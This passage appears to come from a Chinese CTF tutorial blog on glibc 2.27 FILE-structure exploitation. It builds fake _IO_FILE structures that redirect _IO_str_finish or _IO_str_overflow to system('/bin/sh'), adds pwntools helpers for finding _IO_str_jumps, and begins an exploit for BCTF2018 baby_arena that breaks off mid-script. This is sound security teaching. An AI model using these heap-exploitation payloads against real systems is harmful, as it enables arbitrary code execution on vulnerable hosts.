href="#IO-str-finish">¶</a>_IO_str_finish</h3><p>这玩意比较简单，先说一下。</p><p>我们仍然需要构造好条件，进入被修改后的 vtable 表 <code>_IO_OVERFLOW</code> 偏移处的函数也就是我们这里的 <code>_IO_str_finish</code>。</p><p>所以 2.23 那里的<strong>条件还是不能丢</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>进入函数后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-type">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br><br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>好的，比较敏感的观众朋友们已经发现了华点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<br></code></pre></td></tr></table></figure><p>这玩意，带了函数指针，很好用。只要把这个 <code>_free_buffer</code> 扬成 <code>system</code> ，<code>fp-&gt;_IO_buf_base</code> 写 <code>/bin/sh\0</code> 地址，剩下的 <strong>dddd</strong>。</p><p>这里 <strong>_s</strong> 是什么 👴 翻了一大半天源码也没弄明白这玩意，于是就摆了。反正 <code>fp-&gt;_s._free_buffer</code> 是 <strong>fp 加一个偏移</strong>。具体的 👴 有 gdb 可以调。👴 测得在 x64 下是 <strong>0xe8</strong>。</p><p>好的，总结一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span> <span class="hljs-comment">// 2.23</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base <span class="hljs-comment">// 2.23</span><br>fp-&gt;vtable = _IO_str_jumps_addr<br>fp-&gt;_flags &amp; _IO_USER_BUF = <span class="hljs-number">0</span> <span class="hljs-comment">// 最低位没有 1 </span><br>fp-&gt;_IO_buf_base != <span class="hljs-number">0</span><br>---&gt; fp-&gt;_IO_buf_base = binsh_addr<br>fp-&gt;_s._free_buffer = system_addr <br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br></code></pre></td></tr></table></figure><h3 id="IO-str-overflow"><a class="header-anchor" href="#IO-str-overflow">¶</a>_IO_str_overflow</h3><p>这是个比较复杂同时很重要的函数，后面我们也会用到这个函数（Hosue of Pig）。</p><p>我们仍然需要构造好条件，进入被修改后的 vtable 表 <code>_IO_OVERFLOW</code> 偏移处的函数也就是我们这里的 <code>_IO_str_overflow</code>。</p><p>所以 2.23 那里的<strong>条件还是不能丢</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>进入函数后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_str_overflow (_IO_FILE *fp, <span class="hljs-type">int</span> c)<br>&#123;<br>  <span class="hljs-type">int</span> flush_only = c == EOF;<br>  _IO_size_t pos;<br>    <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>    <br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br>    <br>  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br><span class="hljs-keyword">return</span> EOF;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-type">char</span> *new_buf;<br>  <span class="hljs-type">char</span> *old_buf = fp-&gt;_IO_buf_base;<br>  <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>  _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br>  <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>    <span class="hljs-keyword">return</span> EOF;<br>  new_buf<br>    = (<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br>  <span class="hljs-keyword">if</span> (new_buf == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/*  __ferror(fp) = 1; */</span><br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (old_buf)<br>    &#123;<br>      <span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);<br>      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);<br>      <span class="hljs-comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span><br>      fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  <span class="hljs-built_in">memset</span> (new_buf + old_blen, <span class="hljs-string">&#x27;\0&#x27;</span>, new_size - old_blen);<br><br>  _IO_setb (fp, new_buf, new_buf + new_size, <span class="hljs-number">1</span>);<br>  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);<br>  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);<br>  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);<br>  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);<br><br>  fp-&gt;_IO_write_base = new_buf;<br>  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (!flush_only)<br>    *fp-&gt;_IO_write_ptr++ = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) c;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)<br>    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">return</span> c;<br>&#125;<br>libc_hidden_def (_IO_str_overflow)<br></code></pre></td></tr></table></figure><p>👴 知道大 🔥 一眼望去直接不想看了，但是我们只需要盯几个点就好了。</p><p><strong>首先是我们的目标</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">new_buf = (<span class="hljs-type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br></code></pre></td></tr></table></figure><p><code>fp-&gt;_s._allocate_buffer</code> 写 system 的地址，<code>new_size</code> 构造成 binsh 的地址。</p><p>其中 <code>fp-&gt;_s._allocate_buffer</code> 是 fp 加一个偏移，👴 测得在 x64 下是 <strong>0xe0</strong>， new_size 计算如下：</p><p>当 binsh_addr 为<strong>偶数</strong>的话就是小学数学：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);<br>  _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br></code></pre></td></tr></table></figure><p>$$<br>2 * old_blen + 100 = binsh_addr\<br>(fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base=\<br>old_blen=(binsh_addr-100)//2<br>$$</p><p>当 binsh_addr 为<strong>奇数</strong>（👴 没咋遇见过），咱加一试试看星不星，实在不行咱不受这气自己找地址写一个就  ok ：</p><p><code>0xa = 10</code> 是偶数，这里只是假装演示一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; search /<span class="hljs-built_in">bin</span>/sh<br>libc-<span class="hljs-number">2.27</span>.so    <span class="hljs-number">0x7f463b5cb0fa</span> <span class="hljs-number">0x68732f6e69622f</span> /* <span class="hljs-string">&#x27;/bin/sh&#x27;</span> */<br>pwndbg&gt; x/s <span class="hljs-number">0x7f463b5cb0fa</span>+<span class="hljs-number">1</span><br><span class="hljs-number">0x7f463b5cb0fb</span>: <span class="hljs-string">&quot;bin/sh&quot;</span><br></code></pre></td></tr></table></figure><p><strong>然后是达成目标，使调用我们的函数指针，避免 return：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*[+]----------------1----------------[+]*/</span><br>    <br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>    <br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br><span class="hljs-comment">/*[+]----------------1----------------[+]*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8 <span class="hljs-comment">/* Writing not allowd */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="hljs-comment">/* Set if put and get pointer logicly tied. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br></code></pre></td></tr></table></figure><p>即二进制表示的 <code>_flags</code> 倒数第三位不能为1 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*[+]----------------2----------------[+]*/</span><br>      <br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br><span class="hljs-keyword">return</span> EOF;<br>      <br><span class="hljs-comment">/*[+]----------------2----------------[+]*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br></code></pre></td></tr></table></figure><p>构造的时候小心点就好了，没啥大问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<br>    &#123;<br><span class="hljs-comment">/*[+]----------------3----------------[+]*/</span> <br>          <br>  <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>    <span class="hljs-keyword">return</span> EOF;<br>          <br><span class="hljs-comment">/*[+]----------------3----------------[+]*/</span><br></code></pre></td></tr></table></figure><p>1,2 咋构造？👴 说俩个数你记着嗷： <code>0xfbad1800</code>  或 <code>0</code> 直接绕完，不要搞花里胡哨的。</p><p>至于 4 ，这玩意应该是防止 <code>new_size = 2 * old_blen + 100</code> 溢出的。一般不会出事。</p><p><strong>总结一下：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><span class="hljs-comment">// 2.23</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<span class="hljs-comment">// 2.23</span><br>fp-&gt;_flags = <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr = <span class="hljs-number">0xffffffffffffffff</span><br>fp-&gt;_s._allocate_buffer = system_addr<br>fp-&gt;_IO_buf_base = <span class="hljs-number">0</span><br>fp-&gt;_IO_buf_end = (binsh_addr<span class="hljs-number">-100</span>)<span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><h3 id="基本构造-v2"><a class="header-anchor" href="#基本构造-v2">¶</a>基本构造</h3><h4 id="IO-str-finish-v2"><a class="header-anchor" href="#IO-str-finish-v2">¶</a>_IO_str_finish</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(binsh)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps-<span class="hljs-number">8</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(system)<br><span class="hljs-keyword">return</span> fake_IO_FILE<br><br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br></code></pre></td></tr></table></figure><h4 id="IO-str-overflow-v2"><a class="header-anchor" href="#IO-str-overflow-v2">¶</a>_IO_str_overflow</h4><p>其实上面那个就够用了，但防止有人说 👴 懒 🐶，👴 还是改了个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base; pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64((binsh-<span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps)<br>fake_IO_FILE += p64(system) <span class="hljs-comment"># 0xe0 _s._allocate_buffer</span><br><span class="hljs-keyword">return</span> fake_IO_FILE<br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br></code></pre></td></tr></table></figure><h3 id="如何定位-IO-str-jumps-？"><a class="header-anchor" href="#如何定位-IO-str-jumps-？">¶</a>如何定位 _IO_str_jumps ？</h3><p>👴 寻思 👴 有了 libc ，偏移又相对固定， 👴 更喜欢直接去 gdb 调试算。</p><p>下面这段是从别的师傅那<strong>CV</strong>的，不喜欢折腾的师傅们可以看下面的。</p><p>由于 <code>_IO_str_jumps</code> 不是导出符号，因此无法直接利用 pwntool s的 <code>libc.sym[&quot;_IO_str_jumps&quot;]</code> 进行定位，我们可以转换一下思路，利用 <code>_IO_str_jumps</code>中的导出函数，例如 <code>_IO_str_underflow</code> 进行辅助定位，我们可以利用gdb去查找所有包含这个<code>_IO_str_underflow</code> 函数地址的内存地址，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p _IO_str_underflow<br>$<span class="hljs-number">1</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="hljs-number">0x7f4d4cf04790</span> &lt;_IO_str_underflow&gt;<br>pwndbg&gt; search -p <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d2240a0</span> <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d224160</span> <span class="hljs-number">0x7f4d4cf04790</span><br>libc.so<span class="hljs-number">.6</span>       <span class="hljs-number">0x7f4d4d2245e0</span> <span class="hljs-number">0x7f4d4cf04790</span><br>pwndbg&gt; p &amp;_IO_file_jumps<br>$<span class="hljs-number">2</span> = (&lt;data variable, no debug info&gt; *) <span class="hljs-number">0x7f4d4d224440</span> &lt;_IO_file_jumps&gt;<br></code></pre></td></tr></table></figure><p>再利用 <code>_IO_str_jumps</code> 的地址大于 <code>_IO_file_jumps</code> 地址的条件，就可以锁定最后一个地址为符合条件的 <code>_IO_str_jumps</code> 的地址，由于 <code>_IO_str_underflow</code> 在<code>_IO_str_jumps</code> 的偏移为0x20，我们可以计算出<code>_IO_str_jumps</code> = 0x7f4d4d2245c0，再减掉libc的基地址，就可以得到<code>_IO_str_jumps</code> 的正确偏移。 当然也可以用IDA <a href="http://xn--Prolibc-nk0l041n.so">Pro分析libc.so</a>，查找<code>_IO_file_jumps</code> 后的jump表即可。 此外，介绍一种直接利用pwntools得到<code>_IO_str_jumps</code> 偏移的方法，思想与采用动态调试分析的方法类似，直接放代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_IO_str_jumps</span>():<br>   IO_file_jumps_offset = libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>   IO_str_underflow_offset = libc.sym[<span class="hljs-string">&#x27;_IO_str_underflow&#x27;</span>]<br>   <span class="hljs-keyword">for</span> ref_offset <span class="hljs-keyword">in</span> libc.search(p64(IO_str_underflow_offset)):<br>       possible_IO_str_jumps_offset = ref_offset - <span class="hljs-number">0x20</span><br>       <span class="hljs-keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:<br>          <span class="hljs-keyword">return</span> possible_IO_str_jumps_offset<br></code></pre></td></tr></table></figure><h3 id="例题-v2"><a class="header-anchor" href="#例题-v2">¶</a>例题</h3><h4 id="baby-arena-BCTF2018-libc2-27-3ubuntu1-2"><a class="header-anchor" href="#baby-arena-BCTF2018-libc2-27-3ubuntu1-2">¶</a>baby_arena_BCTF2018 &lt;libc2.27-3ubuntu1.2&gt;</h4><h5 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h5><p>和 2.23 一样。</p><h5 id="思路-v2"><a class="header-anchor" href="#思路-v2">¶</a>思路</h5><p>思路和上题一毛一样。注意改一下偏移，以及 global_max_fast 利用时候的堆块大小。</p><h5 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span 